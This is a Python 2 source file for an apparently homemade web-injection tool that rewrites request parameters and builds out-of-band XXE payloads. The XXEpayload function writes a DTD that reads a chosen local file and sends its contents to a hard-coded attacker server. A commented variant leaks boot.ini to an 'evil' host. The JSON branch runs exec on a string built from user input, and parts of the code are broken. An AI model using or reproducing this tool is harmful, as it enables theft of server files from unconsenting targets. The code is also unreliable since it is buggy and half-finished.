import urllib2,urllib,json
from urlparse import urlparse
import re

class Request_maker:
	def __init__(self):
		self.dx=None
		self.attackerserver="http://192.168.186.1:1337" # your fucking machine here! :D,location of dtd
		self.attackerserverDTD=self.attackerserver + "/xxe.dtd"

	def HTTPrequest(self,url,method,add_header,post_data):
		print 'HTTPrequest module is called'
		#code that support TRACE,PUT,DELETE.
		#post_data=self.URLdecode(post_data,target,'adriantest')
		#post_data=urllib.urlencode(post_data)
		request=urllib2.Request(url,post_data,add_header)
		try: 
			response=urllib2.urlopen(request)
			HTTPresponse={
			'body' : response.read(),
			'response_header' : response.headers,
			'response_code' : response.getcode(),
			'info' : response.info(),
			'targeturl' : response.geturl(),
			'request_header' : request.header_items(),
			'get_data' : request.get_data(),
			'target_host' : request.get_host()
			}
		#except urllib2.URLError as e:
		#	print 'Target not found \n'
		#	print e.reason
		except urllib2.HTTPError as e:
			print e.reason
			HTTPresponse={
			'body' : e.reason,
			'response_header' : 'null',
			'response_code' : 'null',
			'info' : 'null',
			'targeturl' : 'null',
			'request_header' : request.header_items(),
			'get_data' : request.get_data(),
			'target_host' : request.get_host()
			}
 
		return HTTPresponse

	def URLdecode(self,parameters,target_param,target_parameter_value,URL,content_type): #disect the GET and POST parameter(S) ,
	#identify if the request is get or post, inserting of payload happens here!
		parse=urlparse(URL)
		print '/n URLdecode function is called /n'
		URLdecoded={}
		targeturl=parse.scheme + "://" + parse.netloc + parse.path

		#####extracting GET data.
		if(parse.query!=""):
			print 'GET parameter(s) is detected!'

			#identity if the request is simple or rest.
			if(content_type=='x-www-form-urlencoded'):#simple request!
				#if content-type is x-www-form-urlencoded call intruder function of request maker
				get_data=self.Intruder(parse.query,target_param,target_parameter_value)
				targeturl=targeturl + '?' + urllib.urlencode(get_data)
			elif(content_type=='json' or content_type=='xml'): #rest sytle
				print '/n xml or json type is called /n'
				#if content-type is json or xml call the XmlJsonIntruder function of request maker
				get_data=self.XmlJsonIntruder(parse.query,target_param,target_parameter_value,content_type)
				#converts dictionary to json
				targeturl=targeturl + '?' + get_data
		else:
			print 'do nothing' + content_type

		####exracting POST data
		if(parameters!=None):
			print 'POST parameter(S) is detected!'
			if(content_type=='x-www-form-urlencoded'):
				#if content-type is x-www-form-urlencoded call intruder function of request maker
				post_data=urllib.urlencode(self.Intruder(parameters,target_param,target_parameter_value))
			elif(content_type=='json' or content_type=='xml'):
				print '/n xml or json type is called /n'
				xmljsondata=parameters
				target_node=target_param
				target_file=target_parameter_value
				#if content-type is json or xml call the XmlJsonIntruder function of request maker
				#converts dictionary to json
				post_data=self.XmlJsonIntruder(xmljsondata,target_node,target_file,content_type)
				#(self,XMLJsonData,target_node,target_file,content_type)



		else:
			post_data=''
		
		URLdecoded={'decoded_url':targeturl,'post_data':post_data} ##return the url and post data
		return URLdecoded
		




		#string.split('&') -> return a list of parameter with it's value
		#string.split('&')[0] -> one by one, parameter and it's value ,['data=dd', 'data1=dd2'],store this data in variable using loop. param_and_value=['data=dd', 'data1=dd2']
		#use the split again to -> split the parameter and the value string.split('&')[0].split('=')
		#[['data', 'dd'],['data1', 'dd2']] -> final, lagay na agad sa final list
		#need loop 
		#param1=data1&param2=data2
		
		#parameter='param1=value1&param2=value2'


	def Intruder(self,parameters,target_param,target_parameter_value): ###  -> disect params and insert the payload here
		parameter=parameters
		i=0
		final=[]
		dict_parameter={}
		for x in  parameter.split('&'):
			fragment=parameter.split('&')[i].split('=')
			#print fragment
			final=final + [fragment]
			i+=1
		dict_parameter=dict(final)
		if(dict_parameter.has_key(target_param)):
			#find then updte
			dict_parameter[target_param]=target_parameter_value
		else:
			print 'key not found';
		return dict_parameter #return a dictonary







	def XmlJsonIntruder(self,XMLJsonData,target_node,target_file,content_type):
		print 'XmlJsonIntruder function called'
		#accept only dictinary only, add some error handler!
		#add some erro handler for 'out of scope' array
		target_node_value=target_file
		hey=''
		if(content_type=='json'):
			jsondata=dict(XMLJsonData)
			command="jsondata" + target_node + "=" + "'" + target_node_value + "'"
			
			exec command
			XmlJson=json.dumps(jsondata)


			



			
			
			#some
		elif(content_type=='xml'):
			#add some DTD changer here
			#<tag> parameter value and attribute value!
			print 'xml is your content_type'
			self.XXEpayload(target_file)



			print 'soon, just replace the doctype with DTD'


			#
		print "your payload\n" + XmlJson


		return XmlJson

	def XXEpayload(self,target_file):
		payload="""<?xml version='1.0' encoding='UTF-8'?>
		<!DOCTYPE root [
		<!ENTITY % remote SYSTEM '""" + self.attackerserverDTD + """'>
		%remote;
		%int;
		%trick;]>"""

		regex=r"""<\?xml version=('|")1.0('|") encoding=('|")UTF-8('|")\?>"""

		XMLJsonData="""<?xml version='1.0' encoding='UTF-8'?>
		""" # the input of user

		#dtd="""<!ENTITY %payl SYSTEM "file:///c:/boot.ini">
		#<!ENTITY %int "<!ENTITY &#37; trick SYSTEM 'http://evil?%payl;'>">
		#"""
		print '/n/n ERROR '
		print target_file 
		dtd="""<!ENTITY % payl SYSTEM '""" + target_file + """'><!ENTITY % int "<!ENTITY &#37; trick SYSTEM '""" + self.attackerserver +"""?%payl;'>">
		"""

		XmlJson=re.sub(regex,payload,XMLJsonData)
		#XmlJson=XMLJsonData.replace("<?xml version='1.0 encoding='UTF-8'?>",payload) #just use regex here! :D
		#get the target_value change the dtd file.
		DTDfile=open('xxe.dtd','w')
		DTDfile.writelines(dtd)
		DTDfile.close()
		return XmlJson













#import re
#regex=r'a'
#results=re.sub(regex,'A','adrian')
#print results	
###import urllib2
##import json
# Whatever structure you need to send goes here:
#jdata = json.dumps({"username":"...", "password":"..."})
#urllib2.urlopen("http://www.example.com/", jdata)



######
#json_string = '{"first_name": "Guido", "last_name":"Rossum"}'
#import json
#parsed_json = json.loads(json_string)
#print(parsed_json['first_name'])
#"Guido"


##python xxe.py "http://192.168.186.136/login" --pdata "username=adrian&password=pass" XXE
